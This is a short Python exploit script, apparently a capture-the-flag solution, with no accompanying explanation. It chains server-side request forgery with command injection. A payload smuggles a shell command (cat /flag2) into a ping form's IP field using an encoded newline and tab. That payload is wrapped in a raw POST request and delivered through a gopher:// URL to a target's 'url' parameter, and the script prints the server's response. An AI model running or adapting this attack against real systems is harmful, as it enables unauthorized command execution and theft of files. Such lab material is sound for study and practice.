import urllib.parse
import requests

if __name__ == '__main__':

    payload = 'ip=127.0.0.1%0a`cat%09/flag2`'
    req = \
        """POST /ping.php HTTP/1.1
        Host: localhost
        Content-Length: {0}
        Content-Type: application/x-www-form-urlencoded
        
        {1}
        """.format(len(payload), payload)
    tmp = urllib.parse.quote(req)
    res = tmp.replace('%0A', '%0D%0A')
    print('_' + res)

    target = ''  # Target url
    data = {
        'url': 'gopher://0.0.0.0:80/_' + res
    }

    t = requests.post(url=target, data=data)

    try:
        follow = t.text.split(r'</code')[1]
    except Exception as e:
        print(e)
    else:
        print(follow)
